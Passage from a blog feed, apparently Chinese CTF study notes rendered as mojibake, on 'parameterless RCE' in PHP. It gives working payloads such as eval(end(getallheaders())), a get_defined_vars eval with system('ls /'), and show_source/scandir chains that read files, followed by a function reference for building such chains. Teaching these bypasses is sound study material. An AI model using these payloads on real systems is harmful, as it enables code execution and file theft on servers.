title="getallheaders()"></a>getallheaders()</h1><p>è¿™ä¸ªå‡½æ•°å¯ä»¥è¿”å›å½“å‰è¯·æ±‚çš„æ‰€æœ‰è¯·æ±‚å¤´ä¿¡æ¯ï¼Œå±€é™äºApache</p><p><code>apache_request_headers()</code>å’Œ<code>getallheaders()</code>åŠŸèƒ½ç›¸ä¼¼ï¼Œå¯äº’ç›¸æ›¿ä»£ï¼Œä¸è¿‡ä¹Ÿæ˜¯å±€é™äºApache</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">eval</span>(<span class="hljs-title">end</span>(<span class="hljs-title">getallheaders</span>()));</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥åœ¨æ•°æ®åŒ…æœ€ååŠ å…¥ä¸€ä¸ªè¯·æ±‚å¤´ï¼Œå†™å…¥æ¶æ„ä»£ç ï¼Œä½¿ç”¨<code>end()</code>å‡½æ•°æŒ‡å‘æœ€åä¸€ä¸ªè¯·æ±‚å¤´ï¼Œä»è€Œå¯ä»¥æ‰§è¡Œå‘½ä»¤</p><p><img src="/2025/04/29/%E6%97%A0%E5%8F%82RCE%E8%A7%A3%E9%A2%98/image-20250416163003976.png" alt="image-20250416163003976"></p><h1 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h1><p>ç›¸è¾ƒäº<code>getallheaders()</code>æ›´åŠ å…·æœ‰æ™®éæ€§ï¼Œè¿™ä¸ªå‡½æ•°å¯ä»¥å›æ˜¾æ‰€æœ‰å˜é‡</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">a</span>=<span class="hljs-function"><span class="hljs-title">eval</span>(<span class="hljs-title">end</span>(<span class="hljs-title">current</span>(<span class="hljs-title">get_defined_vars</span>())));&amp;<span class="hljs-variable">b</span>=<span class="hljs-title">system</span>(<span class="hljs-string">&#x27;ls /&#x27;</span>);</span><br></code></pre></td></tr></table></figure><ul><li><code>get_defined_vars()</code>è·å–å·²ç»å®šä¹‰çš„æ‰€æœ‰å˜é‡å¹¶è¿”å›ä¸€ä¸ªæ•°ç»„</li><li><code>current()</code>æ¥æ”¶å‰é¢çš„å‡½æ•°è¿”å›çš„æ•°ç»„å¹¶è¿”å›æ•°ç»„ç¬¬ä¸€ä¸ªå…ƒç´ </li><li><code>end()</code>å°†ä¼šç§»åŠ¨æ•°ç»„å†…éƒ¨æŒ‡é’ˆåˆ°æœ€åä¸€ä¸ªæ•°ç»„å…ƒç´ å¹¶è¿”å›è¿™ä¸ªå€¼</li><li><code>eval</code>å°†ä¼šæ‰§è¡Œè¿”å›çš„å€¼ï¼Œç„¶åå¼•ç”¨èµ‹å€¼ï¼ˆå°±æ˜¯&amp;ç¬¦å·ï¼‰ï¼Œå°†åè¾¹å‘½ä»¤çš„ç»“æœèµ‹å€¼ç»™bï¼Œè¿™ä¸ªbå°±æ˜¯æ•°ç»„çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œæœ€ç»ˆä¼šè¢«evalæ‰§è¡Œå¹¶ä¸”è¾“å‡ºç»“æœ</li></ul><h1 id="chdir-array-rand-èµŒç‹—è¯»æ–‡ä»¶"><a href="#chdir-array-rand-èµŒç‹—è¯»æ–‡ä»¶" class="headerlink" title="chdir()&amp;array_rand()èµŒç‹—è¯»æ–‡ä»¶"></a>chdir()&amp;array_rand()èµŒç‹—è¯»æ–‡ä»¶</h1><p>å¦‚æœæ— æ³•è¿›è¡ŒRCEï¼Œå¯ä»¥è¿›è¡Œç›®å½•éå†è¯»å–æ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># è·å–å½“å‰ç›®å½•</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">getcwd</span>());<br><br><span class="hljs-comment"># åˆ—å‡ºå½“å‰å·¥ä½œç›®å½•çš„çˆ¶ç›®å½•ä¸­çš„æ‰€æœ‰æ–‡ä»¶å’Œç›®å½•</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">getcwd</span>())));<br><br><span class="hljs-comment"># è¯»ä¸Šä¸€çº§æ–‡ä»¶å</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-title function_ invoke__">array_rand</span>(<span class="hljs-title function_ invoke__">array_flip</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">getcwd</span>())))))));<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-title function_ invoke__">array_rand</span>(<span class="hljs-title function_ invoke__">array_flip</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-title function_ invoke__">hebrevc</span>(<span class="hljs-title function_ invoke__">crypt</span>(<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-title function_ invoke__">next</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">getcwd</span>())))))))))));<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-title function_ invoke__">array_rand</span>(<span class="hljs-title function_ invoke__">array_flip</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-title function_ invoke__">hebrevc</span>(<span class="hljs-title function_ invoke__">crypt</span>(<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-title function_ invoke__">next</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-title function_ invoke__">hebrevc</span>(<span class="hljs-title function_ invoke__">crypt</span>(<span class="hljs-title function_ invoke__">phpversion</span>())))))))))))))));<br><br><span class="hljs-comment"># è¯»æ ¹ç›®å½•</span><br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-title function_ invoke__">crypt</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">array</span>())))))));<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-title function_ invoke__">array_rand</span>(<span class="hljs-title function_ invoke__">array_flip</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-title function_ invoke__">crypt</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">array</span>() )))))))))));<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>æ¼æ´ç¬”è®°</category>
      
      <category>RCE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ— å‚RCE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ— å‚RCEå‡½æ•°</title>
    <link href="/2025/04/29/%E6%97%A0%E5%8F%82RCE%E5%87%BD%E6%95%B0/"/>
    <url>/2025/04/29/%E6%97%A0%E5%8F%82RCE%E5%87%BD%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="æ— å‚RCE"><a href="#æ— å‚RCE" class="headerlink" title="æ— å‚RCE"></a>æ— å‚RCE</h1><p>æ— å‚<code>RCE</code>å°±æ˜¯æ— æ³•ä½¿ç”¨å‚æ•°ï¼Œåªèƒ½ä½¿ç”¨å‡½æ•°æ¥è¾¾åˆ°å‘½ä»¤æ‰§è¡Œçš„æ•ˆæœ</p><h2 id="å‡½æ•°"><a href="#å‡½æ•°" class="headerlink" title="å‡½æ•°"></a>å‡½æ•°</h2><h3 id="localeconv"><a href="#localeconv" class="headerlink" title="localeconv()"></a><code>localeconv()</code></h3><p>è¿™ä¸ªå‡½æ•°å¯ä»¥è·å–å½“å‰åœ°åŒºçš„æ•°å­—å’Œè´§å¸ä¿¡æ¯</p><p>**ä¼ å…¥å€¼ï¼š**æ— éœ€ä¼ å…¥å‚æ•°</p><p>**è¿”å›å€¼ï¼š**è¿”å›å†…å®¹æ˜¯ä¸€ä¸ªåŒ…å«ä¼—å¤šæ ¼å¼åŒ–è®¾ç½®çš„å…³è”æ•°ç»„</p><p>æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯ç‚¹</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">localeconv</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/29/%E6%97%A0%E5%8F%82RCE%E5%87%BD%E6%95%B0/image-20250416003019393.png" alt="image-20250416003019393"></p><h3 id="current"><a href="#current" class="headerlink" title="current()"></a><code>current()</code></h3><p>è·å–æ•°ç»„çš„å½“å‰å…ƒç´ </p><p>**ä¼ å…¥å€¼ï¼š**ä¸€ä¸ªæ•°ç»„</p><p>**è¿”å›å€¼ï¼š**è¿™ä¸ªå‡½æ•°ä¼šè¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ ï¼Œåœ¨æ¯ä¸€ä¸ªæ•°ç»„ä¸­éƒ½æœ‰ä¸€ä¸ªå†…éƒ¨æŒ‡é’ˆæŒ‡å‘è¿™æŸä¸ªå…ƒç´ ï¼Œé»˜è®¤æƒ…å†µä¸‹æŒ‡å‘ç¬¬ä¸€ä¸ªå…ƒç´ </p><p>è¿™ä¸ªå¯ä»¥ä¸<code>localeconv()</code>æ­é…ä½¿ç”¨ï¼Œä»è€Œè·å–<code>localeconv()</code>è¿”å›çš„æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ç‚¹<code>.</code></p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">current</span>(<span class="hljs-title">localeconv</span>())</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/29/%E6%97%A0%E5%8F%82RCE%E5%87%BD%E6%95%B0/image-20250416004146301.png" alt="image-20250416004146301"></p><h3 id="pos"><a href="#pos" class="headerlink" title="pos()"></a><code>pos()</code></h3><p>è¿™ä¸ªå‡½æ•°æ˜¯<code>current()</code> çš„åˆ«åå‡½æ•°ï¼Œå’Œå…¶ä½œç”¨ä¸€æ ·æ˜¯è·å–æ•°ç»„çš„å½“å‰å…ƒç´ </p><p>**ä¼ å…¥å€¼ï¼š**ä¸€ä¸ªæ•°ç»„</p><p>**è¿”å›å€¼ï¼š**è¿™ä¸ªå‡½æ•°ä¼šè¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ ï¼Œåœ¨æ¯ä¸€ä¸ªæ•°ç»„ä¸­éƒ½æœ‰ä¸€ä¸ªå†…éƒ¨æŒ‡é’ˆæŒ‡å‘è¿™æŸä¸ªå…ƒç´ ï¼Œé»˜è®¤æƒ…å†µä¸‹æŒ‡å‘ç¬¬ä¸€ä¸ªå…ƒç´ </p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">pos</span>(<span class="hljs-title">localeconv</span>())</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/29/%E6%97%A0%E5%8F%82RCE%E5%87%BD%E6%95%B0/image-20250416134932036.png" alt="image-20250416134932036"></p><h3 id="scandir"><a href="#scandir" class="headerlink" title="scandir()"></a><code>scandir()</code></h3><p>è¿™ä¸ªå‡½æ•°å¯ä»¥è·å–å½“å‰ç›®å½•çš„æ–‡ä»¶å’Œå­ç›®å½•</p><p>**ä¼ å…¥å€¼ï¼š**æ¥æ”¶å‚æ•°æ˜¯è¦æ‰«æçš„è·¯å¾„</p><p>**è¿”å›å€¼ï¼š**è¿”å›å€¼æ˜¯è¯¥ç›®å½•åŒ…å«çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">scandir</span><span class="hljs-params">(<span class="hljs-string">&#x27;.&#x27;</span>)</span></span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/29/%E6%97%A0%E5%8F%82RCE%E5%87%BD%E6%95%B0/image-20250416002528162.png" alt="image-20250416002528162"></p><p>å› ä¸ºæ˜¯æ— å‚RCEï¼Œæ‰€ä»¥å¼•å·å’Œç‚¹è¿™äº›ç¬¦å·å¯èƒ½ä¼šç¦ç”¨ï¼Œå°±è¦å’Œ<code>localeconv()</code>å’Œ<code>current</code>æ­é…ä½¿ç”¨</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">scandir</span>(<span class="hljs-title">current</span>(<span class="hljs-title">localeconv</span>()))</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/29/%E6%97%A0%E5%8F%82RCE%E5%87%BD%E6%95%B0/image-20250416004214299.png" alt="image-20250416004214299"></p><h3 id="glob"><a href="#glob" class="headerlink" title="glob()"></a><code>glob()</code></h3><p>è¿™æ˜¯ä¸€ä¸ªç”¨äºæ–‡ä»¶è·¯å¾„åæ¨¡å¼åŒ¹é…çš„å‡½æ•°ï¼Œå¯ä»¥è·å–åŒ…å«åŒ¹é…æ–‡ä»¶è·¯å¾„çš„æ•°ç»„</p><p>**ä¼ å…¥å€¼ï¼š**è¦åŒ¹é…çš„æ–‡ä»¶è·¯å¾„å</p><p>**è¿”å›å€¼ï¼š**ä¸€ä¸ªåŒ…å«åŒ¹é…æ–‡ä»¶è·¯å¾„çš„æ•°ç»„</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">glob</span><span class="hljs-params">(<span class="hljs-string">&#x27;*&#x27;</span>)</span></span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/29/%E6%97%A0%E5%8F%82RCE%E5%87%BD%E6%95%B0/image-20250416145431516.png" alt="image-20250416145431516"></p><h3 id="getcwd"><a href="#getcwd" class="headerlink" title="getcwd()"></a><code>getcwd()</code></h3><p>è·å–å½“å‰å·¥ä½œç›®å½•çš„ç»å¯¹è·¯å¾„</p><p>**ä¼ å…¥å€¼ï¼š**è¿™ä¸ªå‡½æ•°æ— éœ€ä¼ å…¥å‚æ•°</p><p>**è¿”å›å€¼ï¼š**ä¼šè¿”å›å½“å‰å·¥ä½œç›®å½•çš„ç»å¯¹è·¯å¾„</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">getcwd</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/29/%E6%97%A0%E5%8F%82RCE%E5%87%BD%E6%95%B0/image-20250416004954555.png" alt="image-20250416004954555"></p><h3 id="dirname"><a href="#dirname" class="headerlink" title="dirname()"></a><code>dirname()</code></h3><p>è·å–è·¯å¾„ä¸­çš„ç›®å½•éƒ¨åˆ†</p><p>**ä¼ å…¥å€¼ï¼š**è¿™ä¸ªå‡½æ•°ä¼šæ¥æ”¶ä¸€ä¸ªè·¯å¾„å‚æ•°</p><p>**è¿”å›å€¼ï¼š**è¿”å›è·¯å¾„ä¸­çš„ç›®å½•éƒ¨åˆ†</p><p>å¯ä»¥å’Œ<code>getcwd()</code>æ­é…ä½¿ç”¨</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">dirname</span>(<span class="hljs-title">getcwd</span>())</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/29/%E6%97%A0%E5%8F%82RCE%E5%87%BD%E6%95%B0/image-20250416004933056.png" alt="image-20250416004933056"></p><h3 id="array-flip"><a href="#array-flip" class="headerlink" title="array_flip()"></a><code>array_flip()</code></h3><p>è¿™ä¸ªå‡½æ•°å¯ä»¥äº¤æ¢æ•°ç»„ä¸­é”®å’Œå€¼çš„ä½ç½®</p><p>**ä¼ å…¥å€¼ï¼š**ä¼šæ¥æ”¶ä¸€ä¸ªæ•°ç»„</p><p>**è¿”å›å€¼ï¼š**è¿”å›ä¸€ä¸ªé”®å’Œå€¼äº¤æ¢ä½ç½®çš„æ•°ç»„</p><p>å¯ä»¥å’Œ<code>scandir(current(localeconv()))</code>æ­é…ä½¿ç”¨</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">array_flip</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">current</span>(<span class="hljs-title">localeconv</span>())))</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/29/%E6%97%A0%E5%8F%82RCE%E5%87%BD%E6%95%B0/image-20250416005304766.png" alt="image-20250416005304766"></p><h3 id="array-reverse"><a href="#array-reverse" class="headerlink" title="array_reverse()"></a><code>array_reverse()</code></h3><p>è¿™ä¸ªå‡½æ•°ä¼šå°†æ•°ç»„ä¸­çš„å…ƒç´ é¢ å€’è¿‡æ¥</p><p>**ä¼ å…¥å€¼ï¼š**æ¥æ”¶ä¸€ä¸ªæ•°ç»„</p><p>**è¿”å›å€¼ï¼š**è¿”å›ä¸€ä¸ªé¢ å€’çš„æ•°ç»„</p><p>å½“è¦é€‰å–çš„æ–‡ä»¶åœ¨é åçš„ä½ç½®æ—¶ï¼Œå¯ä»¥ä½¿ç”¨è¿™ä¸ªå‡½æ•°ä½¿å…¶æå‰</p><p>å¯ä»¥å’Œ<code>array_flip(scandir(current(localeconv())))</code>æ­é…ä½¿ç”¨ï¼Œ</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">array_reverse</span>(<span class="hljs-title">array_flip</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">current</span>(<span class="hljs-title">localeconv</span>()))))</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/29/%E6%97%A0%E5%8F%82RCE%E5%87%BD%E6%95%B0/image-20250416010045017.png" alt="image-20250416010045017"></p><h3 id="array-rand"><a href="#array-rand" class="headerlink" title="array_rand()"></a><code>array_rand()</code></h3><p>è¿™ä¸ªå‡½æ•°å¯ä»¥ä»ä¸€ä¸ªæ•°ç»„ä¸­éšæœºæŠ½å–ä¸€ä¸ªæˆ–å¤šä¸ªé”®</p><p>**ä¼ å…¥å€¼ï¼š**ä¼šæ¥æ”¶ä¸€ä¸ªæ•°ç»„ï¼Œå¦‚æœæ²¡æœ‰æŒ‡å®šé€‰å–é”®çš„æ•°é‡ä¼šé»˜è®¤ä¸º1</p><p>**è¿”å›å€¼ï¼š**ä¼šè¿”å›éšæœºé€‰å–çš„é”®</p><p>å¯ä»¥å’Œ<code>array_rand(array_flip(scandir(current(localeconv()))))</code>æ­é…ä½¿ç”¨ï¼Œä»è€Œè¾¾åˆ°éšæœºé€‰å–æ–‡ä»¶çš„æ•ˆæœ</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">array_rand</span>(<span class="hljs-title">array_flip</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">current</span>(<span class="hljs-title">localeconv</span>()))))</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/29/%E6%97%A0%E5%8F%82RCE%E5%87%BD%E6%95%B0/image-20250416005715362.png" alt="image-20250416005715362"></p><h3 id="chdir"><a href="#chdir" class="headerlink" title="chdir()"></a><code>chdir()</code></h3><p>è¿™ä¸ªå‡½æ•°ä¼šæ”¹å˜å½“å‰è„šæœ¬çš„å·¥ä½œç›®å½•</p><p>**ä¼ å…¥å€¼ï¼š**éœ€è¦æ¥æ”¶ç›®æ ‡ç›®å½•çš„è·¯å¾„</p><p>**è¿”å›å€¼ï¼š**è¿”å›å€¼æ˜¯å¸ƒå°”ç±»å‹</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">chdir</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/29/%E6%97%A0%E5%8F%82RCE%E5%87%BD%E6%95%B0/image-20250416134329290.png" alt="image-20250416134329290"></p><h3 id="strrev"><a href="#strrev" class="headerlink" title="strrev()"></a><code>strrev()</code></h3><p>è¿™ä¸ªå‡½æ•°å¯ä»¥å°†å­—ç¬¦ä¸²åè½¬</p><p>**ä¼ å…¥å€¼ï¼š**è¦è¿›è¡Œåè½¬çš„å­—ç¬¦ä¸²</p><p>**è¿”å›å€¼ï¼š**åè½¬åçš„å­—ç¬¦ä¸²</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">strrev</span><span class="hljs-params">(<span class="hljs-string">&quot;Hello&quot;</span>)</span></span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/29/%E6%97%A0%E5%8F%82RCE%E5%87%BD%E6%95%B0/image-20250416134617004.png" alt="image-20250416134617004"></p><h3 id="end"><a href="#end" class="headerlink" title="end()"></a><code>end()</code></h3><p>å¯ä»¥å°†æ•°ç»„å†…éƒ¨æŒ‡é’ˆç§»åŠ¨åˆ°æœ€åä¸€ä¸ªå…ƒç´ </p><p>**ä¼ å…¥å€¼ï¼š**è¦æ“ä½œçš„æ•°ç»„</p><p>**è¿”å›å€¼ï¼š**è¿”å›æ•°ç»„çš„æœ€åä¸€ä¸ªå…ƒç´ çš„å€¼</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">end</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">current</span>(<span class="hljs-title">localeconv</span>())))</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/29/%E6%97%A0%E5%8F%82RCE%E5%87%BD%E6%95%B0/image-20250416150215077.png" alt="image-20250416150215077"></p><p><img src="/2025/04/29/%E6%97%A0%E5%8F%82RCE%E5%87%BD%E6%95%B0/image-20250416150230880.png" alt="image-20250416150230880"></p><h3 id="next"><a href="#next" class="headerlink" title="next()"></a><code>next()</code></h3><p>å¯ä»¥å°†æ•°ç»„çš„å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨ä¸€ä½</p><p>**ä¼ å…¥å€¼ï¼š**è¦æ“ä½œçš„æ•°ç»„</p><p>**è¿”å›å€¼ï¼š**è¿”å›ç§»åŠ¨åå†…éƒ¨æŒ‡é’ˆæ‰€æŒ‡å‘çš„å…ƒç´ çš„å€¼ï¼Œå¦‚æœè¶…å‡ºæ•°ç»„èŒƒå›´ä¼šè¿”å›<code>false</code></p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">next</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">current</span>(<span class="hljs-title">localeconv</span>())))</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/29/%E6%97%A0%E5%8F%82RCE%E5%87%BD%E6%95%B0/image-20250416150716805.png" alt="image-20250416150716805"></p><h3 id="prev"><a href="#prev" class="headerlink" title="prev()"></a><code>prev()</code></h3><p>å°†æ•°ç»„çš„å†…éƒ¨æŒ‡é’ˆå€’å›ä¸€ä½</p><p>**ä¼ å…¥å€¼ï¼š**è¦æ“ä½œçš„æ•°ç»„</p><p>**è¿”å›å€¼ï¼š**è¿”å›å€’å›åå†…éƒ¨æŒ‡é’ˆæŒ‡å‘çš„å…ƒç´ çš„å€¼ï¼Œå¦‚æœè¶…å‡ºæ•°ç»„èŒƒå›´ä¼šè¿”å›<code>false</code></p><h3 id="reset"><a href="#reset" class="headerlink" title="reset()"></a><code>reset()</code></h3><p>å°†æ•°ç»„å†…éƒ¨æŒ‡é’ˆé‡ç½®åˆ°ç¬¬ä¸€ä¸ªå…ƒç´ </p><p>**ä¼ å…¥å€¼ï¼š**è¦æ“ä½œçš„æ•°ç»„</p><p>**è¿”å›å€¼ï¼š**è¿”å›é‡ç½®åçš„å†…éƒ¨æŒ‡é’ˆæŒ‡å‘çš„å…ƒç´ çš„å€¼ï¼Œå³æ•°ç»„ç¬¬ä¸€ä¸ªå…ƒç´ çš„å€¼</p><h3 id="each"><a href="#each" class="headerlink" title="each()"></a><code>each()</code></h3><p>å¯ä»¥è·å–å½“å‰æ•°ç»„å†…éƒ¨æŒ‡é’ˆæŒ‡å‘çš„å…ƒç´ çš„é”®å’Œå€¼ï¼Œå¹¶å°†æŒ‡é’ˆå‘åç§»åŠ¨ä¸€ä½</p><p>**ä¼ å…¥å€¼ï¼š**è¦æ“ä½œçš„æ•°ç»„</p><p>**è¿”å›å€¼ï¼š**è¿”å›ä¸€ä¸ªåŒ…å«å››ä¸ªå…ƒç´ çš„æ•°ç»„ï¼Œé”® <code>0</code> å’Œ <code>key</code> å¯¹åº”å…ƒç´ çš„é”®ï¼Œé”® <code>1</code> å’Œ <code>value</code> å¯¹åº”å…ƒç´ çš„å€¼ã€‚å¦‚æœæ•°ç»„æŒ‡é’ˆå·²ç»è¶…å‡ºæ•°ç»„èŒƒå›´ï¼Œè¿”å› <code>false</code></p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">each</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">current</span>(<span class="hljs-title">localeconv</span>())))</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/29/%E6%97%A0%E5%8F%82RCE%E5%87%BD%E6%95%B0/image-20250416152519020.png" alt="image-20250416152519020"></p><h3 id="ord"><a href="#ord" class="headerlink" title="ord()"></a><code>ord()</code></h3><p>è·å–å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ASCIIç å€¼</p><p>**ä¼ å…¥å€¼ï¼š**è¦å¤„ç†çš„å­—ç¬¦ä¸²</p><p>**è¿”å›å€¼ï¼š**å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ASCIIç å€¼</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title"><span class="hljs-built_in">ord</span></span>(<span class="hljs-title">end</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">current</span>(<span class="hljs-title">localeconv</span>()))))</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/29/%E6%97%A0%E5%8F%82RCE%E5%87%BD%E6%95%B0/image-20250416152845903.png" alt="image-20250416152845903"></p><h3 id="chr"><a href="#chr" class="headerlink" title="chr()"></a><code>chr()</code></h3><p>å’Œ<code>ord()</code>å‡½æ•°åŠŸèƒ½ç›¸åï¼Œè¿™ä¸ªå‡½æ•°æ˜¯å°†ASCIIç å€¼è½¬åŒ–ä¸ºå­—ç¬¦</p><p>**ä¼ å…¥å€¼ï¼š**ASCIIç å€¼</p><p>**è¿”å›å€¼ï¼š**è¿”å›ASCIIç å€¼å¯¹åº”çš„å­—ç¬¦</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">chr</span>(<span class="hljs-title"><span class="hljs-built_in">ord</span></span>(<span class="hljs-title">end</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">current</span>(<span class="hljs-title">localeconv</span>())))))</span><br></code></pre></td></tr></table></figure><p><img src="/2025/04/29/%E6%97%A0%E5%8F%82RCE%E5%87%BD%E6%95%B0/image-20250416153117794.png" alt="image-20250416153117794"></p><h3 id="getallheaders"><a href="#getallheaders" class="headerlink" title="getallheaders()"></a><code>getallheaders()</code></h3><p>è¿™ä¸ªå‡½æ•°å¯ä»¥è·å–å…¨éƒ¨çš„ HTTP è¯·æ±‚å¤´</p><p>**ä¼ å…¥å€¼ï¼š**æ— éœ€ä¼ 